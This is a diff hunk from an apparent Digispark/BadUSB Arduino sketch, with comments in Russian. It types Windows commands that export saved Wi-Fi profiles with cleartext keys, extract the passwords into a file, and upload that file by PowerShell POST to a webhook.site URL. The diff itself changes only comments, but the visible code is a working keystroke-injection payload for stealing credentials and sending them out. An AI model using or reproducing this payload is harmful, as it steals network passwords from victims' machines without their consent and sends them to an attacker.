@@ -15,9 +15,9 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("cd %appdata%");
   DigiKeyboard.delay(300); 
-  DigiKeyboard.println("netsh wlan export profile key=clear");
+  DigiKeyboard.println("netsh wlan export profile key=clear"); //получить все профили вай фай
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Select-String -Path *.xml -Pattern 'keyMaterial' > wifi_pass"); //Получить пароли вай фай
+  DigiKeyboard.println("powershell Select-String -Path *.xml -Pattern 'keyMaterial' > wifi_pass"); //выделить все файл xml и экспортировать в wifi_pass
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<Your unique URL> -Method POST -InFile wifi_pass"); //Отправка на веб хук паролей вай фай
   DigiKeyboard.delay(1000);  
